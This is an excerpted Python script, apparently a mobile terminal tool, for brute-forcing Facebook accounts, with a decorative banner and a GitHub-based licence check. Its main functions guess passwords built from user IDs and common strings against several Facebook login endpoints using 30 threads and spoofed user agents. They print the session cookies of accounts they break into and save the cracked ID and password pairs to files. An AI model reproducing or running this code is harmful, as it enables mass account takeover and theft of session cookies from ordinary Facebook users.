# fb id https://www.facebook.com/sourabhmaharaj302?mibextid=ZbWKwL
...
os.system("clear")
print("\033[1;32mFOLLOW MY \033[1;31mFACEBOOK \033[1;32mID")
os.system("xdg-open https://www.facebook.com/sourabhmaharaj302?mibextid=ZbWKwL")
#app  check 
...
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[1;32m        [ HAR  ◈✙◈ \33[1;33mHAR ◈✙◈\33[1;37m MAHADEV  ]          ║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[1;33m(•)●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;35m๑۩♡۩๑\033[0;95m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●💔
\033[1;36m[•] ━▷ \033[1;31mCREATED BY   ◈✙◈  \033[1;31mOWNER SOURABH 
\033[1;32m[•] ━▷ \033[1;36mFACEBOOK      ◈✙◈  \033[1;36mSOURABH MAHARAJ 
\033[1;37m[•] ━▷ \033[1;37mGITHUB       ◈✙◈  \033[1;37mMAHARAJ-09
\033[1;33m[•] ━▷ \033[1;32mSTATUS       ◈✙◈  \033[1;32mTOOL IS FREE
\033[1;37m[•] ━▷ \033[1;32mWHATSAPP.    ◈✙◈  \033[1;37UUSE NHI KARTA HU 
\033[1;37m(•)●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;35m๑۩♡۩๑\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●💔\n\n"""  
loop = 0
oks = []
cps = []
os.system('espeak -a 300 " Welcome,   to,  SOURABH ,Tools"')
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://github.com/Maharaj-09/aaprove.txt').text
  ...
  try:
    httpCaht = requests.get("https://github.com/Maharaj-09/aproobe.txt/main/aaprove.txt").text
    if id in httpCaht:
      ...
      os.system('xdg-open https://wa.me/9888952534')
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def tnx():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "_".join(uuid)
  server = requests.get('https://github.com/Maharaj-09/aproobe.txt/main/aaprove.txt').text
...
def xerx():
    ...
    elif aryan =='7':os.system("xdg-open https://www.facebook.com/sourabhmaharaj302?mibextid=ZbWKwL")
    else:
...
def xerx1():
	...
	os.system('clear')
	print(logo)
	print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (8305)')
	print(47*'-')
	...
	print('[?] Ids saved in EXE-OK.txt,EXE-CP.txt')
...
def xerx2():
	...
	print('[?] Ids saved in SOURABH-OK.txt, SOURABH-CP.txt')
	print(47*"-")
...
def xerx3():
	...
	os.system('clear')
	print(logo)
	print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (9812)')
	print(47*'-')
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			...
			mk = uid[:6]
			pwx = [guru]
			pwx = [kode+guru,mk,'5727200','59039200','57575751','khan123','khan1122','Free Fire','i love you','freefire123','khan786','khan12345']
			if xerxfire =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif xerxfire =='2':yaari.submit(p,uid,pwx,tl)
			elif xerxfire =='3':yaari.submit(x,uid,pwx,tl)
			elif xerxfire =='4':yaari.submit(mobile,uid,pwx,tl)
	...
	try:
		for ps in pwx:
            ...
            'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2006C3LII Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]',}
			...
			if 'c_user' in log_cookies:
				...
				uid = coki[151:166]
				print('\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
				print('\33[1;92m[SOURABH-OK 🧡] '+uid+' | '+ps+'|'+Joined(uid)+'\r\033[1;35m')
				if 'y' in xerx_xd:
					print(f"\033[1;33m[COOKIES ❤️]: \033[1;32m{coki}")
					print('\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/SOURABH-OK.txt', 'a').write(uid+' | '+ps+'\n')
				oks.append(cid)
				break
				...
				uid = coki[151:166]
				if 'y' in baby:
					print('\33[1;91m[SOURABH-CP] '+uid+' | '+ps+'\33[0;97m')
					open('/sdcard/SOURABH-CP.txt', 'a').write(uid+' | '+ps+'\n')
					cps.append(uid)
					break
				else:
					open('/sdcard/SOURABH-CP.txt', 'a').write(uid+' | '+ps+'\n')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M1-SOURABH🧡] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def p(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\33[1;92m[SOURABH 🧡] '+uid+' | '+ps+'|'+Joined(uid)+'\r\033[1;35m')
				if 'y' in xerx_xd:
					print(f"\033[1;33m[COOKIES ❤️]: \033[1;32m{coki}")
					cek_apk(session,coki)
				else:
				...
				if 'y' in baby:
					...
					open('/sdcard/SOURABH-CP.txt', 'a').write(cid+' | '+ps+'\n')
					break
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M2-SOURABH🧡] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				if 'y' in xerx_xd:
					...
					break
				open('/sdcard/ELISHA-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M3-SOURABH🧡] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def mobile(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				uid = coki[151:166]
				print('\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
				print('\33[1;92m[SOURABH-OK🧡]\033[1;32m'+uid+' | '+ps+'|'+Joined(uid)+'\r\033[1;35m')
				if 'y' in xerx_xd:
					print(f"\033[1;33m[COOKIES ❤️]: \033[1;32m{coki}")
					print('\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
					cek_apk(session,coki)
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M4-SOURABH🧡] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				if 'y' in xerx_xd:
					...
					break
				open('/sdcard/SOURABH-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid = coki[151:166]
				if 'y' in baby:
					print('\33[1;91m[SOURABH-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/SOURABH-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M5-SOURABH🧡] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def d(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M6-SOURABH🧡] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
